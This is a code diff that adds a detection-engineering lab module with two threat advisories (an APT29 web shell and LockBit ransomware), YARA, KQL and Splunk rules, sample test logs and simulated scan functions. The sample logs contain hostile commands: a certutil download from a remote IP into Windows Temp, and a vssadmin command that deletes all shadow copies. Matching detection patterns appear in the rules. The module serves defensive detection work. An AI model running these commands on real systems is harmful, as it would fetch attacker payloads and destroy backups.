@@ -1394,3 +1394,206 @@ export function analyzeRuleResilience(rule: Rule): ResilienceReport {
 
   return { level, score, resilience, colorClass, explanation, recommendations };
 }
+
+// 8. THREAT INTEL TO DETECTION LAB MODELS & ENGINES
+export interface ThreatAdvisory {
+  id: string;
+  title: string;
+  source: string;
+  extract: string;
+  logicBreakdown: {
+    step: string;
+    indicator: string;
+    translation: string;
+  }[];
+  yaraCode: string;
+  kqlCode: string;
+  splCode: string;
+  yaraPayload: string; // Default HEX/ASCII payload for testing
+  kqlPayload: string;  // Default KQL JSON log
+  splPayload: string;  // Default Splunk JSON log
+}
+
+export const THREAT_ADVISORIES: ThreatAdvisory[] = [
+  {
+    id: "apt29-webshell",
+    title: "APT29 Web Server Exploitation & Web Shell",
+    source: "CISA Advisory AA23-263A (APT29 Target Exchange Servers)",
+    extract: "Threat actors associated with APT29 exploited public-facing Exchange servers to establish persistence. Once inside, they uploaded custom ASPX web shells. The binary uploads contain a specific token string 'Sec-WebShell-Token' used to authenticate commands. Secondary behavior includes executing shell operations via Windows utilities, specifically leveraging certutil.exe to download remote C2 components using the '-urlcache' flag.",
+    logicBreakdown: [
+      {
+        step: "Extract File Signatures",
+        indicator: "Upload of a binary (MZ executable) containing custom token 'Sec-WebShell-Token'",
+        translation: "YARA rule mapping: uint16(0) == 0x5A4D (MZ header) AND ascii string '$token'"
+      },
+      {
+        step: "Identify LOLBAS Download Behavior",
+        indicator: "Processes invoking 'certutil.exe' with the caching parameter '-urlcache' to pull down binaries",
+        translation: "KQL mapping: DeviceProcessEvents | where ProcessCommandLine has 'certutil.exe' and ProcessCommandLine has '-urlcache'"
+      },
+      {
+        step: "Define Splunk Event Search",
+        indicator: "Event ID 1 process launches in Sysmon matching certutil downloader arguments",
+        translation: "SPL mapping: index=sysmon EventID=1 CommandLine='*certutil.exe*urlcache*'"
+      }
+    ],
+    yaraCode: `rule APT29_WebShell_Detection {
+    meta:
+        description = "Detects custom ASPX web shell binary uploaded by APT29"
+        author = "Detection Engineer"
+        reference = "CISA Alert AA23-263A"
+        threat_actor = "APT29"
+        date = "2026-06-10"
+    strings:
+        $magic = { 4D 5A } // MZ file header
+        $token = "Sec-WebShell-Token" ascii wide
+    condition:
+        $magic at 0 and $token
+}`,
+    kqlCode: `DeviceProcessEvents
+| where ProcessCommandLine has "certutil.exe" 
+    and ProcessCommandLine has_any ("-urlcache", "-split")
+| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName`,
+    splCode: `index=ep_sysmon sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=1 
+    CommandLine="*certutil.exe*" (CommandLine="*urlcache*" OR CommandLine="*split*")
+| table _time, host, user, ProcessId, CommandLine`,
+    yaraPayload: "4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000e1fba0e00b409cd21b8014ccd215365632d5765625368656c6c2d546f6b656e",
+    kqlPayload: `{
+  "DeviceName": "WS-IIS-PROD01",
+  "AccountName": "IIS_IUSRS",
+  "ProcessCommandLine": "certutil.exe -urlcache -f http://91.240.118.12/update.bin C:\\\\Windows\\\\Temp\\\\update.exe",
+  "InitiatingProcessFileName": "w3wp.exe"
+}`,
+    splPayload: `{
+  "host": "WS-IIS-PROD01",
+  "user": "IIS_IUSRS",
+  "CommandLine": "certutil.exe -urlcache -f http://91.240.118.12/update.bin C:\\\\Windows\\\\Temp\\\\update.exe",
+  "ProcessId": 4821
+}`
+  },
+  {
+    id: "lockbit-execution",
+    title: "LockBit Ransomware Persistence & Recovery Disruption",
+    source: "CISA Advisory AA24-100A (LockBit Ransomware Activity)",
+    extract: "Adversaries deploying LockBit ransomware achieve local persistence by modifying Windows registry run keys, creating a subkey value targeting the path '...\\CurrentVersion\\Run\\LockBitUpdate'. The binary then immediately attempts to disrupt system restoration by invoking 'vssadmin.exe delete shadows /all /quiet' to erase volume shadow backup snapshots from disk.",
+    logicBreakdown: [
+      {
+        step: "Extract Persistence Subkeys",
+        indicator: "Writes containing 'LockBitUpdate' inside Windows Run keys",
+        translation: "YARA rule mapping: matching string 'LockBitUpdate' inside executable memory"
+      },
+      {
+        step: "Identify Shadow Copy Deletion",
+        indicator: "Invocation of vssadmin.exe with arguments command 'delete shadows'",
+        translation: "KQL mapping: DeviceProcessEvents | where ProcessCommandLine has 'vssadmin.exe' and ProcessCommandLine has 'delete' and ProcessCommandLine has 'shadows'"
+      },
+      {
+        step: "Define Splunk Shadow Alert",
+        indicator: "Security Log Event ID 4688 matching volume shadow copy deletion arguments",
+        translation: "SPL mapping: index=security EventID=4688 CommandLine='*vssadmin.exe*delete*shadows*'"
+      }
+    ],
+    yaraCode: `rule LockBit_Ransomware_Execution {
+    meta:
+        description = "Detects LockBit persistence subkeys and execution sequences"
+        author = "Detection Engineer"
+        reference = "CISA Alert AA24-100A"
+        threat_actor = "LockBit Group"
+        date = "2026-06-10"
+    strings:
+        $magic = { 4D 5A } // MZ header
+        $registry_key = "SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\LockBitUpdate" ascii wide
+        $shadow_delete = "vssadmin.exe delete shadows" ascii wide
+    condition:
+        $magic at 0 and ($registry_key or $shadow_delete)
+}`,
+    kqlCode: `DeviceProcessEvents
+| where ProcessCommandLine has "vssadmin.exe" 
+    and ProcessCommandLine has "delete" 
+    and ProcessCommandLine has "shadows"
+| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine`,
+    splCode: `index=ad_security sourcetype="WinEventLog:Security" EventID=4688 
+    NewProcessName="*vssadmin.exe" CommandLine="*delete*" CommandLine="*shadows*"
+| table _time, host, SubjectUserName, CommandLine`,
+    yaraPayload: "4d5a90000300000004000000ffff0000b80000000000000040000000000000000000000076737361646d696e2e6578652064656c65746520736861646f7773202f616c6c202f7175696574",
+    kqlPayload: `{
+  "DeviceName": "DC-01",
+  "AccountName": "Administrator",
+  "ProcessCommandLine": "vssadmin.exe delete shadows /all /quiet"
+}`,
+    splPayload: `{
+  "host": "DC-01",
+  "SubjectUserName": "Administrator",
+  "CommandLine": "vssadmin.exe delete shadows /all /quiet"
+}`
+  }
+];
+
+export function simulateYaraScan(advisoryId: string, payload: string): { triggered: boolean; matchedStrings: string[]; error: string | null } {
+  try {
+    const raw = payload.trim();
+    let ascii = raw;
+    let hex = raw.replace(/\s+/g, "").toLowerCase();
+
+    // Check if it's hex format
+    const isHex = /^[0-9a-f]+$/.test(hex) && hex.length % 2 === 0;
+    if (isHex) {
+      let str = "";
+      for (let i = 0; i < hex.length; i += 2) {
+        str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
+      }
+      ascii = str;
+    } else {
+      // If it's ascii, build hex representation for matching
+      let h = "";
+      for (let i = 0; i < ascii.length; i++) {
+        h += ascii.charCodeAt(i).toString(16).padStart(2, "0");
+      }
+      hex = h;
+    }
+
+    const matchedStrings: string[] = [];
+    let triggered = false;
+
+    if (advisoryId === "apt29-webshell") {
+      const hasMagic = ascii.startsWith("MZ") || hex.startsWith("4d5a");
+      const hasToken = ascii.includes("Sec-WebShell-Token");
+      if (hasMagic) matchedStrings.push("$magic (MZ header)");
+      if (hasToken) matchedStrings.push("$token (\"Sec-WebShell-Token\")");
+      triggered = hasMagic && hasToken;
+    } else if (advisoryId === "lockbit-execution") {
+      const hasMagic = ascii.startsWith("MZ") || hex.startsWith("4d5a");
+      const hasRegistry = ascii.includes("LockBitUpdate");
+      const hasShadow = ascii.includes("vssadmin.exe delete shadows");
+
+      if (hasMagic) matchedStrings.push("$magic (MZ header)");
+      if (hasRegistry) matchedStrings.push("$registry_key (\"LockBitUpdate\")");
+      if (hasShadow) matchedStrings.push("$shadow_delete (\"vssadmin.exe delete shadows\")");
+      triggered = hasMagic && (hasRegistry || hasShadow);
+    }
+
+    return { triggered, matchedStrings, error: null };
+  } catch (err: any) {
+    return { triggered: false, matchedStrings: [], error: err.message };
+  }
+}
+
+export function simulateSIEMQuery(advisoryId: string, logType: "kql" | "spl", logText: string): { triggered: boolean; error: string | null } {
+  try {
+    const record = JSON.parse(logText);
+    let triggered = false;
+
+    if (advisoryId === "apt29-webshell") {
+      const cmd = String(record.ProcessCommandLine || record.CommandLine || "").toLowerCase();
+      triggered = cmd.includes("certutil") && (cmd.includes("urlcache") || cmd.includes("split"));
+    } else if (advisoryId === "lockbit-execution") {
+      const cmd = String(record.ProcessCommandLine || record.CommandLine || "").toLowerCase();
+      triggered = cmd.includes("vssadmin") && cmd.includes("delete") && cmd.includes("shadows");
+    }
+
+    return { triggered, error: null };
+  } catch (err: any) {
+    return { triggered: false, error: `JSON Parse Error: ${err.message}` };
+  }
+}
+
